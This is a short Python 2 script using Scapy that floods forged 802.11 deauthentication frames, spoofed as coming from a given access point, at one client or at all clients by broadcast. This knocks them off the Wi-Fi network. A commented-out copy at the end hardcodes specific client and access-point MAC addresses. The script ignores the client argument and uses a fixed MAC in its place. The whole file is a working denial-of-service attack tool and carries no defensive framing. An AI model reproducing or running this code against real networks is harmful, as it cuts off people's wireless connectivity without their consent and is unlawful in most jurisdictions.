#!/usr/bin/env python
#----coding:utf-8-----

import time
import sys
from scapy.all import *


iface = "wlan1mon"
timeout = 1
if len(sys.argv) < 2:
    print "The Demo use:" + " <bssid> <client>"
    sys.exit(0)
else:
    bssid = sys.argv[1]
if len(sys.argv) == 3:
    Destination = "b4:0b:44:c2:d5:ff" #sys.argv[2]

else:
    Destination = "ff:ff:ff:ff:ff:ff"
frame = RadioTap() / \
    Dot11(subtype=0xc,
        addr1=Destination, addr2=bssid, addr3=bssid) / \
    Dot11Deauth(reason=3)
while True:
    print "Sending Deauth Attack to " + Destination
    sendp(frame, iface=iface)
    time.sleep(timeout)



'''
interface='wlan0mon'


client='B4:0B:44:C2:D5:FF'
ap='50:FA:84:6D:02:B8'

pkt=Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=3)

frame=RadioTap()/pkt

while 1:

    sendp(frame,iface=interface)
'''
